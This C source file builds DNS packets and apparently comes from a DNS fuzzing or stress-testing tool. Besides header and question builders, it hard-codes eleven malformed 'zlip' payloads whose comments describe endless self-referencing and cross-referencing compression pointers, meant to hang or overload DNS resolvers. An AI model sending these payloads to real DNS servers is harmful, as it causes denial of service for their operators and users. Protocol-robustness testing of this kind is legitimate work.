#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include "dns.h"
#include "common.h"
#include "mt19937int.h"

static char const cvsid[] = "$Id: dns-build.c,v 1.10 2001/10/13 11:35:21 vikrum Exp $";

void
make_dns_header(char *packet,
	unsigned short int      id,
	unsigned char           rd,
	unsigned char           tc,
	unsigned char           aa,
	unsigned char           opcode,
	unsigned char           qr,
	unsigned char           rcode,
	unsigned char           unused,
	unsigned char           pr,
	unsigned char           ra,
	unsigned short int      que_num,
	unsigned short int      rep_num,
	unsigned short int      num_rr,
	unsigned short int      num_rrsup)
{
	struct dnshdr           *dns = (struct dnshdr *)packet;

	dns->id = htons(id);
	dns->rd = rd;
	dns->tc = tc;
	dns->aa = aa;
	dns->opcode = htons(opcode);
	dns->qr = qr;
	dns->rcode = htons(rcode);
	dns->unused = htons(unused);
	dns->pr = pr;
	dns->ra = ra;
	dns->que_num = htons(que_num);
	dns->rep_num = htons(rep_num);
	dns->num_rr = htons(num_rr);
	dns->num_rrsup = htons(num_rrsup);
}

void
make_rand_dns_header(char *packet)
{
	struct dnshdr           *dns = (struct dnshdr *)packet;

	dns->id = htons((u_short)genrand());
	dns->rd = (u_char)genrand();
	dns->tc = (u_char)genrand();
	dns->aa = (u_char)genrand();
	dns->opcode = htons((u_char)genrand());
	dns->qr = (u_char)genrand();
	dns->rcode = htons((u_char)genrand());
	dns->unused = htons((u_char)genrand());
	dns->pr = (u_char)genrand();
	dns->ra = (u_char)genrand();
	dns->que_num = htons((u_short)genrand());
	dns->rep_num = htons((u_short)genrand());
	dns->num_rr = htons((u_short)genrand());
	dns->num_rrsup = htons((u_short)genrand());
}

void
set_dns_id(char *packet, unsigned short int dns_id)
{
	struct dnshdr           *dns = (struct dnshdr *)packet;
	dns->id = htons(dns_id);
}

void
nameformat (char *name, char *QS) {
        char *buffer, *x;
        char elem[128];

        *QS = 0;
        buffer = malloc(strlen(name)+2);
	strcpy(buffer, name);
        x = strtok(buffer, ".");

        while (x != NULL) {
                if (snprintf(elem, 128, "%c%s", strlen(x), x) == 128) {
                        perror("string overflow");
                        exit (EXIT_FAILURE);
                }
                strcat(QS, elem);
                x = strtok(NULL, ".");
        }
        free(buffer);
}

int
make_zlip_packet(char *data, int type)
{
	int			len = 0;
	/* zlip-1.c        endless, pointing to itself message decompression */
	u_char			*zlip1 = "\xc0\x0c\xc0\x07\xc0\x10\xc0\x17\xc0\x20"
					 "\xc0\x27\xc0\x30\xc0\xff\xcf\x00\x00\x00"
					 "\x01\x00\x01"; 
	/* zlip-2.c        endless cross referencing at message decompression */
	u_char			*zlip2 = "\xc0\x0e\xc0\x0c\xc0\x10\xc0\x17\xc0\x20"
					 "\xc0\x27\xc0\x30\xc0\xff\xcf\x00\x00\x00"
					 "\x01\x00\x01"; 
	/* zlip-3.c        creating a very long domain through multiple decompression of the same hostname */
        u_char  		*zlip3 = "\x3exxxxxxxxx"
					 "xxxxxxxxxx"
					 "xxxxxxxxxx"
					 "xxxxxxxxxx"
					 "xxxxxxxxxx"
					 "xxxxxxxxxx"
					 "xxx\xc0\x0c\xc0\x0c\xc0\x0c\xc0"
					 "\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0"
					 "\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0"
					 "\x0c\xc0\x0c\x00\x01\x00\x01";

	u_char			*zlip4 = "\x04host\x0a"
					 "domain";

/*	u_char			*zlip5 = "\x03 . \x08speedera"
 *					 "\x03net\x00\x00\x01\x00\x01";
 */
	u_char			*zlip5 = "\x03 . \x05pivia\x03net\x00\x00\x01\x00\x01";
 
	u_char			*zlip6 = "\x05vvvvv\xc0\x00\xc0\xff\xc0\x0c\xc0\x42\x03net\x00\x00\x01\x00\x01";

	u_char			*zlip7 = "\x00";

	/* "big" number, but BOTH leading bits are NOT zero */
	u_char			*zlip8 = "\xbc\x0c\xc0\x0c\x00\x00\x01\x00\x01";

	u_char			*zlip9 = "\x00\x00\x00\x01\x00\x01";

	u_char			*zlip10 = "\x3e\x01\xc0\xc0\xc0\x02\xc0\x0d\xc0\xdd"
					  "\xc0\x11\xc0\x00\xc0\x1f\xc0\x0e\x00\x00"
					  "\x01\x00\x01"; 

	u_char			*zlip11 = "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c\xc0\x0c"
					  "\x01\x00\x01"; 
	*data = 0;
	switch(type) {
		case 1:
			len = 23;
			bcopy(zlip1, data, len);
			break;
		case 2:
			len = 23;
			bcopy(zlip2, data, len);
			break;
		case 3:
//			len = strlen(zlip3);
			len = 97;
			bcopy(zlip3, data, len);
			break;
		case 4:
			len = 12;
			bcopy(zlip4, data, len);
			break;
		case 5:
			len = 19;
			bcopy(zlip5, data, len);
			break;
		case 6:
			len = 23;
			bcopy(zlip6, data, len);
			break;
		case 7:
			len = 1;
			bcopy(zlip7, data, len);
			break;
		case 8:
			len = 9;
			bcopy(zlip8, data, len);
			break;
		case 9:
			len = 6;
			bcopy(zlip9, data, len);
			break;
		case 10:
			len = 23;
			bcopy(zlip10, data, len);
			break;
		case 11:
			len = 513;
			bcopy(zlip11, data, len);
			break;
		default:
			break;
	}
        return(len);
}

int
make_question_packet(char *data, char *name, int type, int class)
{
	nameformat(name,data);
	*( (u_short *) (data+strlen(data)+1) ) = ( type == 0 ) ? htons((u_short)genrand()) : htons(type);
	*( (u_short *) (data+strlen(data)+3) ) = ( class == 0 ) ? htons((u_short)genrand()) : htons(class);
        return(strlen(data)+5);
}

void
set_dns_type(char *data, int type)
{
	*( (u_short *) (data+strlen(data)+1) ) = htons(type);
}

void
set_dns_class(char *data, int class)
{
	*( (u_short *) (data+strlen(data)+3) ) = htons(class);
}
